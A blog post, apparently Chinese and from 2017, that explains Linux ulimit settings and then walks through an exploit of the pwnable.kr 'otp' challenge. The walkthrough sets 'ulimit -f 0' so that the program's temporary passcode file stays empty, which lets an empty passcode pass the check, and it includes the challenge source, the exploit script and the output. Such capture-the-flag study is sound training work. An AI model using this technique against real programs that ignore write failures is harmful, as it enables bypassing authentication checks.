---
title: ulimit在pwn题中的应用
date: 2017-09-27 20:01:48
categories: pwn
tags: [shell]
---

### 1、ulimit简介

Linux对于每个用户，系统限制其最大进程数。为提高性能，可以根据设备资源情况，设置各linux 用户的最大进程数

可以用ulimit -a 来显示当前的各种用户进程限制。

下表是我的虚拟机各个参数的限制

```
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 7744
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 7744
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```

#### 1.1 ulimit参数

ulimit：显示（或设置）用户可以使用的资源的限制（limit），这限制分为软限制（当前限制）和硬限制（上限），其中硬限制是软限制的上限值，应用程序在运行过程中使用的系统资源不超过相应的软限制，任何的超越都导致进程的终止。

 

参数 描述

ulimited 不限制用户可以使用的资源，但本设置对可打开的最大文件数（max open files）和可同时运行的最大进程数（max user processes）无效

-a 列出所有当前资源极限

-c 设置core文件的最大值.单位:blocks

-d 设置一个进程的数据段的最大值.单位:kbytes

-f Shell 创建文件的文件大小的最大值，单位：blocks

-h 指定设置某个给定资源的硬极限。如果用户拥有 root 用户权限，可以增大硬极限。任何用户均可减少硬极限

-l 可以锁住的物理内存的最大值

-m 可以使用的常驻内存的最大值,单位：kbytes

-n 每个进程可以同时打开的最大文件数

-p 设置管道的最大值，单位为block，1block=512bytes

-s 指定堆栈的最大值：单位：kbytes

-S 指定为给定的资源设置软极限。软极限可增大到硬极限的值。如果 -H 和 -S 标志均未指定，极限适用于以上二者

-t 指定每个进程所使用的秒数,单位：seconds

-u 可以运行的最大并发进程数

-v Shell可使用的最大的虚拟内存，单位：kbytes

<font color=#f00>用ulimit -s unlimited 就可以关闭aslr</font>

#### 1.2 ulimit设置【临时】

其他建议设置成无限制（unlimited）的一些重要设置是：

数据段长度：ulimit -d unlimited

最大内存大小：ulimit -m unlimited

堆栈大小：ulimit -s unlimited

CPU 时间：ulimit -t unlimited

虚拟内存：ulimit -v unlimited

暂时地，适用于通过 ulimit 命令登录 shell 会话期间。

#### 1.3 永久设置相关选项【永久】

永久地，通过将一个相应的 ulimit 语句添加到由登录 shell 读取的文件中， 即特定于 shell 的用户资源文件，如：

- 解除 Linux 系统的最大进程数和最大文件打开数限制：

```
vi /etc/security/limits.conf
# 添加如下的行
* soft noproc 11000
* hard noproc 11000
* soft nofile 4100
* hard nofile 4100
```

​        # 添加如下的行

​        * soft noproc 11000

​        * hard noproc 11000

​        * soft nofile 4100

​        * hard nofile 4100

​       说明：* 代表针对所有用户，noproc 是代表最大进程数，nofile 是代表最大文件打开数

- 让 SSH 接受 Login 程式的登入，方便在 ssh 客户端查看 ulimit -a 资源限制：

​        a、vi /etc/ssh/sshd_config

​             把 UserLogin 的值改为 yes，并把 # 注释去掉

​        b、重启 sshd 服务：

​              /etc/init.d/sshd restart

- 修改所有 linux 用户的环境变量文件：

 ```
vi /etc/profile
ulimit -u 10000
ulimit -n 4096
ulimit -d unlimited
ulimit -m unlimited
ulimit -s unlimited
ulimit -t unlimited
ulimit -v unlimited
 ```

 保存后运行#source /etc/profile 使其生效

- 解除程序能打开的文件个数限制

有时候在程序里面需要打开多个文件，进行分析，系统一般默认数量是1024，（用ulimit -a可以看到）对于正常使用是够了，但是对于程序来讲，就太少了。

修改2个文件。

1. /etc/security/limits.conf

vi /etc/security/limits.conf

加上：

```
* soft nofile 8192
* hard nofile 20480
```

2. /etc/pam.d/login

session required /lib/security/pam_limits.so

另外确保/etc/pam.d/system-auth文件有下面内容

session required /lib/security/$ISA/pam_limits.so

这一行确保系统会执行这个限制。

3. 一般用户的.bash_profile

\#ulimit -n 1024

重新登陆ok

### 2、ulimit在pwn中的应用

说到ulimit在pwn中的应用，这里就不得不提到pwnable.kr上的一道题otp：

题目描述如下

>I made a skeleton interface for one time password authentication system.
>I guess there are no mistakes.
>could you take a look at it?
>
>hint : not a race condition. do not bruteforce.
>
>ssh otp@pwnable.kr -p2222 (pw:guest)

该题已经给出了源码！通过源码以及既定的思维方式，一般很难找到这题的利用方法。这题的利用方式就是用ulimit设置文件size的最大值。

otp.c源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

int main(int argc, char* argv[]){
    char fname[128];
    unsigned long long otp[2];

    if(argc!=2){
        printf("usage : ./otp [passcode]\n");
        return 0;
    }

    int fd = open("/dev/urandom", O_RDONLY);
    if(fd==-1) exit(-1);

    if(read(fd, otp, 16)!=16) exit(-1);
    close(fd);

    sprintf(fname, "/tmp/%llu", otp[0]);
    FILE* fp = fopen(fname, "w");
    if(fp==NULL){ exit(-1); }
    fwrite(&otp[1], 8, 1, fp);
    fclose(fp);

    printf("OTP generated.\n");

    unsigned long long passcode=0;
    FILE* fp2 = fopen(fname, "r");
    if(fp2==NULL){ exit(-1); }
    fread(&passcode, 8, 1, fp2);
    fclose(fp2);

    if(strtoul(argv[1], 0, 16) == passcode){
        printf("Congratz!\n");
        system("/bin/cat flag");
    }
    else{
        printf("OTP mismatch\n");
    }

    unlink(fname);
    return 0;
}
```

exp.py

```python
import subprocess
subprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT)
```

利用

>otp@ubuntu:~$ ulimit -f 0
>otp@ubuntu:~$ python /tmp/otp/exp.py
>otp@ubuntu:~$ OTP generated.
>Congratz!
>Darn... I always forget to check the return value of fclose() :(



